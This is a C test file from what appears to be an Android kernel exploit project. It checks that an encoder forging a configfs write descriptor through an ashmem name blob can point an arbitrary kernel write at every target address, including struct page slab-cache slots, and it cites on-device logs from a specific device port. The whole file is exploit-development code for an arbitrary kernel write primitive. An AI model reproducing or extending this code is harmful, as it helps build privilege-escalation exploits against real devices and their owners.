/* Write-control encodability: the file position is a free parameter, so plans
 * that the pinned position cannot deliver must still resolve. Exercises the
 * real encoder from 08_ashmem_configfs_rw.c. */
#define _GNU_SOURCE
#include <assert.h>
#include <errno.h>
#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "../src/08_ashmem_configfs_rw.c"

/* Re-derive what the kernel's word-at-a-time strscpy replay does to a control,
 * then assert the encoder's own predicate agrees with it. */
static int control_survives_replay(const unsigned char *control) {
  unsigned char encoded[TARGET_CONFIGFS_CONTROL_LEN];
  simulate_ashmem_name_blob(control, sizeof(encoded), encoded);
  return memcmp(control + TARGET_CONFIGFS_WRITE_STATE_OFF,
                encoded + TARGET_CONFIGFS_WRITE_STATE_OFF,
                TARGET_CONFIGFS_WRITE_STATE_LEN) == 0;
}

static int plan_encodes(uint64_t addr, size_t len) {
  struct configfs_write_plan plan;
  unsigned char control[TARGET_CONFIGFS_CONTROL_LEN];
  if (!prepare_configfs_write_control(addr, len, &plan, control)) {
    return 0;
  }
  /* The kernel writes to bin_buffer + ki_pos; it must land on the target. */
  uint64_t bin_buffer = 0;
  uint32_t size = 0;
  memcpy(&bin_buffer, control + TARGET_CONFIGFS_WRITE_HIGH_OFF,
         sizeof(bin_buffer));
  memcpy(&size, control + TARGET_CONFIGFS_WRITE_END_OFF, sizeof(size));
  assert(bin_buffer + plan.pos == addr);
  assert(bin_buffer == addr - plan.pos);
  assert(size == plan.size);
  assert(plan.size <= (uint32_t)INT32_MAX);
  /* bin_buffer_size must cover position + payload or the kernel reallocates
   * the buffer and discards the forged descriptor. */
  assert((uint64_t)plan.size >= plan.pos + len);
  assert(control_survives_replay(control));
  return 1;
}

/* The exact guard slots that the pinned encoder rejected on-device
 * (port-dm1q/guard-ident.log, class=00). */
static void check_ondevice_guard_slots(void) {
  static const uint64_t slots[] = {
      0xfffffffe00ff5018ULL,
      0xfffffffe00ba9218ULL,
      0xfffffffe00bc2818ULL,
      0xfffffffe00159418ULL,
  };
  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    assert(plan_encodes(slots[i], sizeof(uint64_t)));
  }
}

/* Addresses the pinned plan already handled must keep their exact plan, so the
 * common path is unchanged. */
static void check_pinned_plans_preserved(void) {
  static const struct {
    uint64_t addr;
    size_t len;
  } cases[] = {
      {0xffffffc00ae96600ULL, 1},
      {0xffffff8a30372180ULL, 35},
      {0xffffff895399b000ULL, 40},
      {0xffffff885206b600ULL, 8},
      {0xffffff803fd40dc0ULL, 8},
      {0xfffffffe01000018ULL, 8},
      {0xfffffffe02000018ULL, 8},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    struct configfs_write_plan plan;
    unsigned char control[TARGET_CONFIGFS_CONTROL_LEN];
    assert(prepare_configfs_write_control(cases[i].addr, cases[i].len, &plan,
                                          control));
    assert(plan.pos == (cases[i].addr & TARGET_CONFIGFS_ADDR_LOW_MASK));
    assert(plan.size == (uint32_t)(plan.pos + cases[i].len));
    assert(control_survives_replay(control));
  }
}

/* Every address the kernel may be asked to write must resolve, including the
 * whole vmemmap slot space and both ends of the direct map. */
static void check_coverage(int full) {
  size_t lens[] = {1, 2, 4, 8, 16, 23, 24, 32, 64, 128, 256};
  long checked = 0, unsolved = 0;
  uint64_t stride = full ? 1 : 977;
  for (uint64_t pfn = 0; pfn < (12ULL << 30) / TARGET_PAGE_SIZE;
       pfn += stride) {
    uint64_t slot =
        TARGET_VMEMMAP_START + pfn * TARGET_STRUCT_PAGE_SIZE +
        TARGET_PAGE_SLAB_CACHE_OFF;
    if (slot >= TARGET_VMEMMAP_END) {
      break;
    }
    checked++;
    if (!plan_encodes(slot, sizeof(uint64_t))) {
      unsolved++;
      if (unsolved <= 5) {
        printf("UNSOLVED slot=%016llx\n", (unsigned long long)slot);
      }
    }
  }
  assert(unsolved == 0);

  /* The fast suite samples the range, but must still pin both boundaries. */
  assert(plan_encodes(TARGET_VMEMMAP_START + TARGET_PAGE_SLAB_CACHE_OFF,
                      sizeof(uint64_t)));
  assert(plan_encodes(TARGET_VMEMMAP_END - TARGET_STRUCT_PAGE_SIZE +
                          TARGET_PAGE_SLAB_CACHE_OFF,
                      sizeof(uint64_t)));

  uint64_t seed = 0x243f6a8885a308d3ULL;
  long samples = full ? 200000 : 20000;
  for (long i = 0; i < samples; i++) {
    seed = seed * 6364136223846793005ULL + 1442695040888963407ULL;
    uint64_t bits = seed >> 8;
    uint64_t addr;
    switch (seed % 3) {
    case 0:
      addr = TARGET_LINEAR_MAP_BASE + (bits & 0x3fffffff0ULL);
      break;
    case 1:
      addr = TARGET_VMEMMAP_START + (bits & 0x3ffffff0ULL);
      break;
    default:
      addr = TARGET_LINEAR_MAP_BASE + (bits & 0xfff0ULL);
      break;
    }
    size_t len = lens[(seed >> 40) % (sizeof(lens) / sizeof(lens[0]))];
    if ((addr & TARGET_PAGE_MASK) + len > TARGET_PAGE_SIZE) {
      continue;
    }
    checked++;
    if (!plan_encodes(addr, len)) {
      unsolved++;
      if (unsolved <= 5) {
        printf("UNSOLVED addr=%016llx len=%zu\n", (unsigned long long)addr,
               len);
      }
    }
  }
  printf("coverage: %ld addresses checked, %ld unsolved\n", checked, unsolved);
  assert(unsolved == 0);
}

int main(int argc, char **argv) {
  int full = argc == 2 && strcmp(argv[1], "--full") == 0;
  assert(argc == 1 || full);
  check_ondevice_guard_slots();
  check_pinned_plans_preserved();
  check_coverage(full);
  puts("PASS write plans encode at every address (position is a free parameter)");
  return 0;
}
